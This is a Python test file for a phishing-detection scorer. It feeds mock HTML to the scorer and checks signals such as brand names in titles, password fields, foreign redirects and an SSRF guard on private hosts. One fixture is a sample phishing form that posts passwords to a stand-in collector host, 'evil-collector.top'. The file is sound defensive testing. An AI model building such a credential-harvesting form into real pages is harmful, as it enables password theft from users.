"""Tests for content-based gray-zone fallback check.

The SSRF guard (``url_is_safe_async``) is patched to True in the HTML-signal
tests so they exercise the scoring logic without a real DNS lookup; a dedicated
test covers the guard rejecting a non-public host.
"""
from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from app.content_check import content_score_adjustment


@pytest.mark.asyncio
async def test_unsafe_host_returns_zero_no_fetch():
    """When the SSRF guard rejects the URL, no HTTP call is made."""
    with patch("app.content_check.url_is_safe_async", AsyncMock(return_value=False)), \
            patch("app.content_check.httpx.AsyncClient") as mock:
        result = await content_score_adjustment(
            "http://192.168.1.1/phish", frozenset({"krungthai"})
        )
    mock.assert_not_called()
    assert result == 0.0


@pytest.mark.asyncio
async def test_brand_in_title_raises_score():
    # Brand appears in page title but the host has no relation to it
    # (path-brand-bait pattern: random host + brand content)
    html = "<html><title>krungthai ลงชื่อเข้าใช้</title></html>"
    with _safe_guard(), patch(
        "app.content_check.httpx.AsyncClient", return_value=_make_mock_client(html)
    ):
        adj = await content_score_adjustment(
            "https://random-abc123.xyz/login",
            frozenset({"krungthai"}),
        )
    assert adj > 0.0


@pytest.mark.asyncio
async def test_password_field_raises_score():
    html = "<html><title>ระบบ</title><input type='password' name='pass'/></html>"
    with _safe_guard(), patch(
        "app.content_check.httpx.AsyncClient", return_value=_make_mock_client(html)
    ):
        adj = await content_score_adjustment(
            "https://somesite.xyz/login",
            frozenset(),
        )
    assert adj >= 0.10


@pytest.mark.asyncio
async def test_thai_official_in_title_lowers_score():
    html = "<html><title>portal.moph.go.th ระบบ</title></html>"
    with _safe_guard(), patch(
        "app.content_check.httpx.AsyncClient", return_value=_make_mock_client(html)
    ):
        adj = await content_score_adjustment(
            "https://legit.moph.go.th/system",
            frozenset(),
        )
    assert adj < 0.0


@pytest.mark.asyncio
async def test_login_form_posting_to_foreign_host_raises_score():
    # Password form whose action exfiltrates to a different host.
    html = (
        "<html><title>เข้าสู่ระบบ</title>"
        "<form action='https://evil-collector.top/grab'>"
        "<input type='password' name='pw'/></form></html>"
    )
    with _safe_guard(), patch(
        "app.content_check.httpx.AsyncClient", return_value=_make_mock_client(html)
    ):
        adj = await content_score_adjustment(
            "https://bank-login.xyz/signin", frozenset()
        )
    # password (0.10) + foreign form action (0.15)
    assert adj >= 0.25


@pytest.mark.asyncio
async def test_same_host_form_action_no_extra_penalty():
    html = (
        "<html><title>เข้าสู่ระบบ</title>"
        "<form action='https://bank-login.xyz/submit'>"
        "<input type='password' name='pw'/></form></html>"
    )
    with _safe_guard(), patch(
        "app.content_check.httpx.AsyncClient", return_value=_make_mock_client(html)
    ):
        adj = await content_score_adjustment(
            "https://bank-login.xyz/signin", frozenset()
        )
    # only the password signal — same-host action is not penalised
    assert adj == pytest.approx(0.10)


@pytest.mark.asyncio
async def test_meta_refresh_to_foreign_host_raises_score():
    html = (
        "<html><head><meta http-equiv='refresh' "
        "content='0;url=https://elsewhere.top/landing'></head></html>"
    )
    with _safe_guard(), patch(
        "app.content_check.httpx.AsyncClient", return_value=_make_mock_client(html)
    ):
        adj = await content_score_adjustment(
            "https://cloaked.xyz/", frozenset()
        )
    assert adj >= 0.10


@pytest.mark.asyncio
async def test_fetch_error_returns_zero():
    mock_client = AsyncMock()
    mock_client.__aenter__ = AsyncMock(side_effect=Exception("timeout"))
    with _safe_guard(), patch(
        "app.content_check.httpx.AsyncClient", return_value=mock_client
    ):
        adj = await content_score_adjustment(
            "https://safe.obec.go.th", frozenset({"obec"})
        )
    assert adj == 0.0


@pytest.mark.asyncio
async def test_non_200_returns_zero():
    with _safe_guard(), patch(
        "app.content_check.httpx.AsyncClient", return_value=_make_mock_client("", 404)
    ):
        adj = await content_score_adjustment("https://example.xyz", frozenset())
    assert adj == 0.0


def _safe_guard():
    """Patch the SSRF guard to allow the fetch (host treated as public)."""
    return patch("app.content_check.url_is_safe_async", AsyncMock(return_value=True))


def _make_mock_client(html: str, status: int = 200):
    mock_resp = MagicMock()
    mock_resp.status_code = status
    mock_resp.text = html

    mock_client = AsyncMock()
    mock_client.__aenter__ = AsyncMock(return_value=mock_client)
    mock_client.__aexit__ = AsyncMock(return_value=None)
    mock_client.get = AsyncMock(return_value=mock_resp)
    return mock_client
